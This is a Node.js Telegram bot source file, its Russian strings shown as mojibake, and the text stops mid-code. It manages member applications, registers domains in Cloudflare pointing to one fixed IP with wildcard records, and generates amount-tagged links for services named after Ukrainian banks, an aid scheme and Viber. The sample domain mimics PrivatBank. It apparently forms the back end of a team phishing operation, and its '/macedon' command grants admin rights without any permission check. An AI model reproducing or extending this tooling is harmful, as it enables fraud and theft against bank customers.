require('dotenv').config({ quiet: true });
const { Telegraf } = require('telegraf');
const fs = require('fs');
const crypto = require('crypto');
const Cloudflare = require('cloudflare');

/* ==========================
   0) –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
========================== */
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID ? String(process.env.ADMIN_CHAT_ID) : null;
const CLOUDFLARE_API_TOKEN = process.env.CLOUDFLARE_API_TOKEN;
const CLOUDFLARE_ACCOUNT_ID = process.env.CLOUDFLARE_ACCOUNT_ID;

if (!BOT_TOKEN) {
  console.error('‚ùå BOT_TOKEN –Ω–µ —É–∫–∞–∑–∞–Ω –≤ .env');
  process.exit(1);
}
if (!CLOUDFLARE_API_TOKEN) {
  console.error('‚ùå CLOUDFLARE_API_TOKEN –Ω–µ —É–∫–∞–∑–∞–Ω –≤ .env');
  process.exit(1);
}
if (!CLOUDFLARE_ACCOUNT_ID) {
  console.error('‚ùå CLOUDFLARE_ACCOUNT_ID –Ω–µ —É–∫–∞–∑–∞–Ω –≤ .env');
  process.exit(1);
}

/* ==========================
   1) –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ –∏ Cloudflare
========================== */
const bot = new Telegraf(BOT_TOKEN);
const cf = new Cloudflare({ token: CLOUDFLARE_API_TOKEN });

/* ==========================
   2) –†–∞–±–æ—Ç–∞ —Å —Ñ–∞–π–ª–∞–º–∏
========================== */
const applicationsFile = 'applications.json';

const readJsonSafe = (path, fallback) => {
  if (!fs.existsSync(path)) return fallback;
  try {
    return JSON.parse(fs.readFileSync(path, 'utf8'));
  } catch (e) {
    console.error(`–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è ${path}:`, e.message);
    return fallback;
  }
};

const writeJsonSafe = (path, data) => {
  try {
    const currentData = JSON.stringify(data);
    const existingData = fs.existsSync(path) ? fs.readFileSync(path, 'utf8') : '{}';
    if (currentData !== existingData) {
      fs.writeFileSync(path, JSON.stringify(data, null, 2));
      console.log(`–§–∞–π–ª ${path} —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω`);
    } else {
      console.log(`–§–∞–π–ª ${path} –Ω–µ –∏–∑–º–µ–Ω–µ–Ω, –ø—Ä–æ–ø—É—Å–∫ –∑–∞–ø–∏—Å–∏`);
    }
  } catch (e) {
    console.error(`–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è ${path}:`, e.message, e.stack);
  }
};

let applications = readJsonSafe(applicationsFile, {});

/* ==========================
   3) –ê–¥–º–∏–Ω—ã: –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
========================== */
const isAdminId = (id) => applications[id]?.admin === true;

const requireAdmin = (ctx) => {
  if (!isAdminId(ctx.from.id)) {
    ctx.reply('–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤. –¢–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—ã –º–æ–≥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç—É –∫–æ–º–∞–Ω–¥—É.');
    return false;
  }
  return true;
};

/* –ó–∞—â–∏—Ç–∞ –æ—Ç –¥—É–±–ª–∏—Ä—É—é—â–∏—Ö callback-–æ–≤ */
const callbackCache = new Map();
const addToCallbackCache = (key) => {
  const now = Date.now();
  if (callbackCache.has(key)) {
    const timestamp = callbackCache.get(key);
    if (now - timestamp < 5000) {
      console.log(`–ü—Ä–æ–ø—É—â–µ–Ω –¥—É–±–ª–∏—Ä—É—é—â–∏–π callback: ${key}`);
      return false;
    }
  }
  callbackCache.set(key, now);
  setTimeout(() => callbackCache.delete(key), 5000);
  return true;
};

/* –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –∞–¥–º–∏–Ω–æ–≤ */
const buildAdminKeyboard = () => {
  const buttons = Object.entries(applications)
    .filter(([id, data]) => id !== 'admins' && id !== 'domains' && data?.username)
    .map(([id, data]) => {
      const isAdmin = data.admin === true;
      const marker = isAdmin ? '‚úÖ' : '‚ùå';
      return [{ text: `${marker} @${data.username} (${id})`, callback_data: `toggle_admin_${id}` }];
    });
  return buttons.length ? buttons : [[{ text: '–ù–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π', callback_data: 'noop' }]];
};

/* ==========================
   4) –°–µ—Ä–≤–∏—Å–Ω—ã–µ —Å—Å—ã–ª–∫–∏ –∏ –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä
========================== */
const serviceLinks = {
  '–î–æ–ø–æ–º–æ–≥–∞': 'https://t.me/dopomoga_group',
  '–†–∞–π—Ñ': 'https://t.me/raif_group',
  '–û—â–∞–¥': 'https://t.me/oshchad_group',
  '–ü—Ä–∏–≤–∞—Ç': 'https://t.me/privat_group',
  '–í–∞–π–±–µ—Ä': 'https://t.me/viber_group',
};

const generateLink = (service, amount, userId) => {
  const userDomain = Object.entries(applications.domains || {})
    .find(([_, data]) => data.ownerId === String(userId) && data.active && data.verified)?.[0];
  const baseUrl = userDomain ? `https://${userDomain}` : (serviceLinks[service] || 'https://t.me/fallback_group');
  const id = crypto.randomUUID();
  const url = `${baseUrl}?amount=${amount}&id=${id}`;
  if (!url.startsWith('https://')) {
    console.error(`–û—à–∏–±–∫–∞: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π URL –¥–ª—è —Å–µ—Ä–≤–∏—Å–∞ ${service} –∏–ª–∏ –¥–æ–º–µ–Ω–∞ ${userDomain}: ${url}`);
    return 'https://t.me/fallback_group';
  }
  console.log(`–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–∞ —Å—Å—ã–ª–∫–∞ –¥–ª—è ${userId}: ${url}`);
  return url;
};

const saveApplications = () => writeJsonSafe(applicationsFile, applications);

/* ==========================
   5) –•—Ä–∞–Ω–∏–ª–∏—â–µ —Å–æ—Å—Ç–æ—è–Ω–∏–π
========================== */
const userState = {};
const domainState = {};

/* ==========================
   6) –û–±—â–∏–µ —Ö–µ–ª–ø–µ—Ä—ã
========================== */
const showServices = (ctx) => {
  console.log(`–ü–æ–∫–∞–∑ —Å–ø–∏—Å–∫–∞ —Å–µ—Ä–≤–∏—Å–æ–≤ –¥–ª—è ${ctx.from.id}`);
  ctx.reply('–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ä–≤–∏—Å:', {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '1 - –î–æ–ø–æ–º–æ–≥–∞', callback_data: 'service_dopomoga' },
          { text: '2 - –†–∞–π—Ñ', callback_data: 'service_raif' },
        ],
        [
          { text: '3 - –û—â–∞–¥', callback_data: 'service_oshchad' },
          { text: '4 - –ü—Ä–∏–≤–∞—Ç', callback_data: 'service_privat' },
        ],
        [{ text: '5 - –í–∞–π–±–µ—Ä', callback_data: 'service_viber' }],
      ],
    },
  });
};

/* ==========================
   7) –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ Telegram API
========================== */
const retryRequest = async (fn, maxRetries = 3, baseDelay = 1000) => {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      if (error.code === 429 && error.response?.parameters?.retry_after) {
        const retryAfter = error.response.parameters.retry_after * 1000;
        console.log(`[retryRequest] –û—à–∏–±–∫–∞ 429, –∂–¥–µ–º ${retryAfter} –º—Å –ø–µ—Ä–µ–¥ –ø–æ–ø—ã—Ç–∫–æ–π ${attempt + 1}`);
        await new Promise((resolve) => setTimeout(resolve, retryAfter));
        continue;
      }
      console.error(`[retryRequest] –û—à–∏–±–∫–∞: ${error.message}, –ø–æ–ø—ã—Ç–∫–∞ ${attempt}`);
      if (attempt === maxRetries) throw error;
      await new Promise((resolve) => setTimeout(resolve, baseDelay * attempt));
    }
  }
  throw new Error(`–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∑–∞–ø—Ä–æ—Å –ø–æ—Å–ª–µ ${maxRetries} –ø–æ–ø—ã—Ç–æ–∫`);
};


/* ==========================
   –§—É–Ω–∫—Ü–∏—è: –ª–æ–≥ DNS-–∑–∞–ø–∏—Å–µ–π
========================== */
async function logDnsRecords(zoneId, domain, ctx) {
  try {
    const records = await cf.dnsRecords.browse(zoneId);
    if (!records || !records.result) {
      await ctx.reply(`‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å DNS-–∑–∞–ø–∏—Å–∏ –¥–ª—è ${domain}`);
      return;
    }
    let out = `üìú DNS-–∑–∞–ø–∏—Å–∏ –¥–ª—è ${domain}:
`;
    for (const r of records.result) {
      out += `‚Ä¢ ${r.type} ${r.name} ‚Üí ${r.content} (TTL ${r.ttl})
`;
    }
    await ctx.reply(out);
  } catch (e) {
    console.error("–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è DNS:", e.message);
    await ctx.reply(`–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è DNS-–∑–∞–ø–∏—Å–µ–π: ${e.message}`);
  }
}


/* ==========================
   8) –°–æ–∑–¥–∞–Ω–∏–µ –∑–∞—è–≤–∫–∏ –∏–∑ —Ç–µ–∫—Å—Ç–∞
========================== */
const handleTextMessage = async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username || '–ù–µ—Ç –∏–º–µ–Ω–∏';
  const firstName = ctx.from.first_name || '';
  const lastName = ctx.from.last_name || '';
  const message = ctx.message.text;

  console.log(`–ü–æ–ª—É—á–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç ${userId} (@${username}): ${message}`);

  if (domainState[userId]?.awaitingDomain) {
    const domain = message.trim().toLowerCase();
    // –†–µ–≥—É–ª—è—Ä–Ω–æ–µ –≤—ã—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∫–∏ .biz.ua –∏ –¥—Ä—É–≥–∏—Ö –¥–≤—É—Ö—É—Ä–æ–≤–Ω–µ–≤—ã—Ö –¥–æ–º–µ–Ω–æ–≤
    if (!/^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](?:\.[a-zA-Z]{2,})+$/.test(domain)) {
      await retryRequest(() =>
        ctx.reply('–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –¥–æ–º–µ–Ω. –í–≤–µ–¥–∏—Ç–µ –¥–æ–º–µ–Ω –≤ —Ñ–æ—Ä–º–∞—Ç–µ example.com –∏–ª–∏ pburarai.biz.ua:', {
          reply_markup: { inline_keyboard: [[{ text: '–û—Ç–º–µ–Ω–∞', callback_data: 'cancel_bind_domain' }]] },
        })
      );
      console.log(`–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –¥–æ–º–µ–Ω –æ—Ç ${userId}: ${domain}`);
      return;
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏—è –¥–æ–º–µ–Ω–∞ –≤ applications.json
    if (applications.domains?.[domain]) {
      await retryRequest(() =>
        ctx.reply(`–î–æ–º–µ–Ω ${domain} —É–∂–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º @${applications.domains[domain].ownerUsername || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}.`)
      );
      console.log(`–î–æ–º–µ–Ω ${domain} —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –≤ applications.json, –≤–ª–∞–¥–µ–ª–µ—Ü: ${applications.domains[domain].ownerId}`);
      delete domainState[userId];
      return;
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏—è –¥–æ–º–µ–Ω–∞ –≤ Cloudflare
    let zoneId;
    try {
      const zones = await cf.zones.list();
      const existingZone = zones.result.find(z => z.name === domain);
      if (existingZone) {
        zoneId = existingZone.id;
        await retryRequest(() =>
          ctx.reply(
            `–î–æ–º–µ–Ω ${domain} —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –≤ Cloudflare (zoneId: ${zoneId}).\n` +
            `–•–æ—Ç–∏—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –µ–≥–æ?`, {
              reply_markup: {
                inline_keyboard: [
                  [{ text: '–î–∞', callback_data: `use_existing_zone_${domain}_${zoneId}` }],
                  [{ text: '–ù–µ—Ç, –≤—ã–±—Ä–∞—Ç—å –¥—Ä—É–≥–æ–π', callback_data: 'cancel_bind_domain' }],
                ],
              },
            }
          )
        );
        domainState[userId] = { domain, zoneId, nameservers: existingZone.name_servers };
        return;
      }
    } catch (error) {
      console.error(`–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏—è –¥–æ–º–µ–Ω–∞ ${domain}:`, error.message);
    }

    // –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–π –∑–æ–Ω—ã, –µ—Å–ª–∏ –¥–æ–º–µ–Ω –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
    try {
      const zone = await cf.zones.create({ name: domain, account: { id: CLOUDFLARE_ACCOUNT_ID } });
      zoneId = zone.result.id;
      const nameservers = zone.result.name_servers;

      // IP-–∞–¥—Ä–µ—Å –¥–ª—è A-–∑–∞–ø–∏—Å–µ–π (IP —Ö–æ—Å—Ç–∏–Ω–≥–∞ Beget)
      const ipAddress = '45.130.41.157'; // –£–∫–∞–∂–∏—Ç–µ –≤–∞—à IP —Ö–æ—Å—Ç–∏–Ω–≥–∞ –∑–¥–µ—Å—å

      // –°–æ–∑–¥–∞–Ω–∏–µ A-–∑–∞–ø–∏—Å–µ–π
      await cf.dnsRecords.create(zoneId, {
        type: 'A',
        name: 'www.' + domain,
        content: ipAddress,
        ttl: 3600,
        proxied: true,
      });
      await cf.dnsRecords.create(zoneId, {
        type: 'A',
        name: domain,
        content: ipAddress,
        ttl: 3600,
        proxied: true,
      });
      await cf.dnsRecords.create(zoneId, {
        type: 'A',
        name: '*.' + domain,
        content: ipAddress,
        ttl: 3600,
        proxied: true,
      });
      console.log(`A-–∑–∞–ø–∏—Å–∏ –¥–ª—è ${domain} –¥–æ–±–∞–≤–ª–µ–Ω—ã: www, @, *`);

      domainState[userId] = { domain, zoneId, nameservers, ipAddress };
      await retryRequest(() =>
        ctx.reply(
          `–î–æ–º–µ–Ω ${domain} –¥–æ–±–∞–≤–ª–µ–Ω –≤ Cloudflare!\n\n` +
          `–î–æ–±–∞–≤—å—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ NS-–∑–∞–ø–∏—Å–∏ —É –≤–∞—à–µ–≥–æ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ–º–µ–Ω–∞:\n` +
          nameservers.map((ns, i) => `${i + 1}. ${ns}`).join('\n') +
          `\n\nA-–∑–∞–ø–∏—Å–∏ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã –Ω–∞ IP: ${ipAddress}.\n` +
          `–ü–æ—Å–ª–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ NS-–∑–∞–ø–∏—Å–µ–π (–º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –¥–æ 24 —á–∞—Å–æ–≤) –Ω–∞–∂–º–∏—Ç–µ "–ü—Ä–æ–≤–µ—Ä–∏—Ç—å".`,
          {
            reply_markup: {
              inline_keyboard: [[{ text: '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å', callback_data: `verify_domain_${domain}` }]],
            },
          }
        )
      );
      console.log(`–î–æ–º–µ–Ω ${domain} –¥–æ–±–∞–≤–ª–µ–Ω –≤ Cloudflare, zoneId: ${zoneId}, NS: ${nameservers.join(', ')}`);
    } catch (error) {
  console.error(`–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –¥–æ–º–µ–Ω–∞ ${domain} –≤ Cloudflare:`, error.message, error.stack);

  // –ï—Å–ª–∏ –¥–æ–º–µ–Ω —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç (–∫–æ–¥ 1061), –ø—Ä–µ–¥–ª–æ–∂–∏–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å—É—â–µ—Å—Ç–≤—É—é—â—É—é –∑–æ–Ω—É
  const msg = (typeof error === 'object' && error !== null && error.message) ? error.message : String(error);
  if (msg.includes("1061") || msg.includes("already exists")) {
    await ctx.reply(
      `–î–æ–º–µ–Ω ${domain} —É–∂–µ –µ—Å—Ç—å –≤ Cloudflare. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –µ–≥–æ?`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: '–î–∞', callback_data: `use_existing_zone_${domain}_manual` }],
            [{ text: '–ù–µ—Ç, –≤—ã–±—Ä–∞—Ç—å –¥—Ä—É–≥–æ–π', callback_data: 'cancel_bind_domain' }],
          ],
        },
      }
    );
    return;
  }

  await retryRequest(() =>
    ctx.reply(
      `–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –¥–æ–º–µ–Ω–∞ ${domain} –≤ Cloudflare. ${msg.includes('already exists') ? '–î–æ–º–µ–Ω —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç, —É–¥–∞–ª–∏—Ç–µ –µ–≥–æ –≤ Cloudflare Dashboard –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –¥—Ä—É–≥–æ–π.' : '–ü—Ä–æ–≤–µ—Ä—å—Ç–µ IP —Å–µ—Ä–≤–µ—Ä–∞ –∏–ª–∏ API-—Ç–æ–∫–µ–Ω.'}`,
      { reply_markup: { inline_keyboard: [[{ text: '–û—Ç–º–µ–Ω–∞', callback_data: 'cancel_bind_domain' }]] } }
    )
  );
}
return;
  }

  if (applications[userId] && applications[userId].status !== 'rejected') {
    return ctx.reply('–í—ã —É–∂–µ –ø–æ–¥–∞–ª–∏ –∑–∞—è–≤–∫—É. –î–æ–∂–¥–∏—Ç–µ—Å—å —Ä–µ—à–µ–Ω–∏—è.');
  }

  applications[userId] = {
    status: 'pending',
    username,
    firstName,
    lastName,
    message,
    timestamp: new Date().toISOString(),
    messageId: null,
    links: [],
  };

  if (!ADMIN_CHAT_ID) {
    console.error('ADMIN_CHAT_ID –Ω–µ —É–∫–∞–∑–∞–Ω –≤ .env ‚Äî –Ω–µ–∫—É–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∑–∞—è–≤–∫–∏');
    saveApplications();
    return ctx.reply('–ó–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞ –ª–æ–∫–∞–ª—å–Ω–æ, –Ω–æ –∞–¥–º–∏–Ω-—á–∞—Ç –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω. –°–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–æ–º.');
  }

  try {
    const sentMessage = await retryRequest(() =>
      bot.telegram.sendMessage(
        ADMIN_CHAT_ID,
        `–ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞ –æ—Ç @${username} (${firstName} ${lastName}):\n${message}`,
        {
          reply_markup: {
            inline_keyboard: [
              [
                { text: '–î–æ–±–∞–≤–∏—Ç—å', callback_data: `approve_${userId}` },
                { text: '–û—Ç–∫–ª–æ–Ω–∏—Ç—å', callback_data: `reject_${userId}` },
              ],
            ],
          },
        }
      )
    );
    applications[userId].messageId = sentMessage.message_id;
    console.log(
      `–ó–∞—è–≤–∫–∞ –æ—Ç ${userId} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ –∞–¥–º–∏–Ω-—á–∞—Ç, messageId: ${sentMessage.message_id}, adminChatId: ${ADMIN_CHAT_ID}`
    );
    saveApplications();
    await ctx.reply('–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –Ω–∞ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∏–µ.');
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –∞–¥–º–∏–Ω-—á–∞—Ç:', error.message, error.stack);
    await ctx.reply('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∑–∞—è–≤–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.');
  }
};

/* ==========================
   9) –ö–æ–º–∞–Ω–¥—ã
========================== */
bot.start((ctx) => {
  const userId = ctx.from.id;
  console.log(`–ö–æ–º–∞–Ω–¥–∞ /start –æ—Ç ${userId}`);

  if (applications[userId] && applications[userId].status === 'approved') {
    ctx.reply('–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', {
      reply_markup: {
        keyboard: [[{ text: '–í—ã–±—Ä–∞—Ç—å —Å–µ—Ä–≤–∏—Å' }, { text: '–ú–æ–∏ —Å—Å—ã–ª–∫–∏' }]],
        resize_keyboard: true,
        one_time_keyboard: false,
      },
    });
  } else if (applications[userId] && applications[userId].status === 'pending') {
    ctx.reply('–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –Ω–∞ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∏–∏. –î–æ–∂–¥–∏—Ç–µ—Å—å —Ä–µ—à–µ–Ω–∏—è.');
  } else {
    ctx.reply('–†–∞—Å—Å–∫–∞–∂–∏—Ç–µ –æ —Å–µ–±–µ:');
  }
});

bot.command('test', async (ctx) => {
  const userId = ctx.from.id;
  const chatId = ctx.chat?.id;
  console.log(`–ö–æ–º–∞–Ω–¥–∞ /test –æ—Ç ${userId}, chatId: ${chatId}`);

  try {
    await ctx.reply('–¢–µ—Å—Ç: –±–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç!');

    if (!ADMIN_CHAT_ID) {
      return ctx.reply('ADMIN_CHAT_ID –Ω–µ —É–∫–∞–∑–∞–Ω –≤ .env, –ø—Ä–æ–ø—É—Å–∫–∞—é –æ—Ç–ø—Ä–∞–≤–∫—É –≤ –∞–¥–º–∏–Ω-—á–∞—Ç.');
    }

    const testMessage = await retryRequest(() =>
      bot.telegram.sendMessage(
        ADMIN_CHAT_ID,
        `–¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç @${ctx.from.username || '–ê–¥–º–∏–Ω'}`,
        { reply_markup: { inline_keyboard: [[{ text: '–¢–µ—Å—Ç–æ–≤–∞—è –∫–Ω–æ–ø–∫–∞', callback_data: 'test_button' }]] } }
      )
    );
    console.log(`–¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ –∞–¥–º–∏–Ω-—á–∞—Ç, messageId: ${testMessage.message_id}, adminChatId: ${ADMIN_CHAT_ID}`);
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –∫–æ–º–∞–Ω–¥—ã /test:', error.message, error.stack);
    await ctx.reply('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–æ–≥–∏.');
  }
});

bot.command('macedon', async (ctx) => {
  const userId = ctx.from.id;
  const parts = ctx.message.text.split(/\s+|=/).filter(Boolean);
  const targetId = Number(parts[1]);
  if (Number.isNaN(targetId)) {
    return ctx.reply('–£–∫–∞–∂–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ü—Ä–∏–º–µ—Ä: /macedon 123456789');
  }

  if (!applications[targetId]) {
    return ctx.reply(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å ID ${targetId} –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –∑–∞—è–≤–∫–∞—Ö.`);
  }

  if (applications[targetId].admin === true) {
    return ctx.reply(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${applications[targetId]?.username ? `@${applications[targetId].username}` : targetId} —É–∂–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä.`);
  }

  applications[targetId].admin = true;
  saveApplications();
  const uname = applications[targetId]?.username ? `@${applications[targetId].username}` : targetId;
  await ctx.reply(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${uname} (${targetId}) –Ω–∞–∑–Ω–∞—á–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.`);
  console.log(`[macedon] –ê–¥–º–∏–Ω –¥–æ–±–∞–≤–ª–µ–Ω: ${targetId} (${uname}) by ${userId}`);
});

bot.command('admin', async (ctx) => {
  if (!requireAdmin(ctx)) return;
  await retryRequest(() =>
    ctx.reply('–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '–î–æ–±–∞–≤–∏—Ç—å –¥–æ–º–µ–Ω', callback_data: 'bind_domain' },
            { text: '–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—ã', callback_data: 'manage_admins' },
          ],
        ],
      },
    })
  );
});

/* ==========================
   10) Callback-–∫–Ω–æ–ø–∫–∏
========================== */
bot.on('callback_query', async (ctx) => {
  const userId = ctx.from.id;
  const callbackData = ctx.callbackQuery.data;
  const messageId = ctx.callbackQuery.message?.message_id;
  const chatId = ctx.chat?.id;
  console.log(`Callback –æ—Ç ${userId}, callbackData: ${callbackData}, messageId: ${messageId}, chatId: ${chatId}`);

  try {
    if (callbackData === 'test_button') {
      console.log(`–¢–µ—Å—Ç–æ–≤–∞—è –∫–Ω–æ–ø–∫–∞ –Ω–∞–∂–∞—Ç–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º ${userId}`);
      await ctx.answerCbQuery('–¢–µ—Å—Ç–æ–≤–∞—è –∫–Ω–æ–ø–∫–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç!');
      return;
    }

    if (callbackData === 'noop') {
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData === 'bind_domain') {
      if (!isAdminId(userId)) {
        await ctx.answerCbQuery('–ù–µ—Ç –ø—Ä–∞–≤.');
        return;
      }
      domainState[userId] = { awaitingDomain: true };
      await retryRequest(() =>
        ctx.reply('–í–≤–µ–¥–∏—Ç–µ –¥–æ–º–µ–Ω (–Ω–∞–ø—Ä–∏–º–µ—Ä, example.com –∏–ª–∏ pburarai.biz.ua):', {
          reply_markup: {
            inline_keyboard: [[{ text: '–û—Ç–º–µ–Ω–∞', callback_data: 'cancel_bind_domain' }]],
          },
        })
      );
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData === 'cancel_bind_domain') {
      delete domainState[userId];
      await ctx.reply('–ü—Ä–∏–≤—è–∑–∫–∞ –¥–æ–º–µ–Ω–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞.');
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData.startsWith('verify_domain_')) {
      const domain = callbackData.replace('verify_domain_', '');
      if (!isAdminId(userId) || !domainState[userId]?.zoneId) {
        await ctx.answerCbQuery('–û—à–∏–±–∫–∞: –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –∑–∞–ø—Ä–æ—Å.');
        return;
      }

      const { zoneId, nameservers } = domainState[userId];
      const ipAddress = domainState[userId]?.ipAddress || '45.130.41.157';
      console.log(`–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –∑–æ–Ω—ã –¥–ª—è ${domain}, zoneId: ${zoneId}`);

      try {
        const zone = await cf.zones.read(zoneId);
        if (zone.result.status !== 'active') {
          await retryRequest(() =>
            ctx.reply(`–î–æ–º–µ–Ω ${domain} –µ—â–µ –Ω–µ –∞–∫—Ç–∏–≤–µ–Ω –≤ Cloudflare. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ, —á—Ç–æ NS-–∑–∞–ø–∏—Å–∏ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã —É —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:\n` +
              nameservers.map((ns, i) => `${i + 1}. ${ns}`).join('\n') +
              `\n\n–ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ 5-10 –º–∏–Ω—É—Ç.`, {
              reply_markup: {
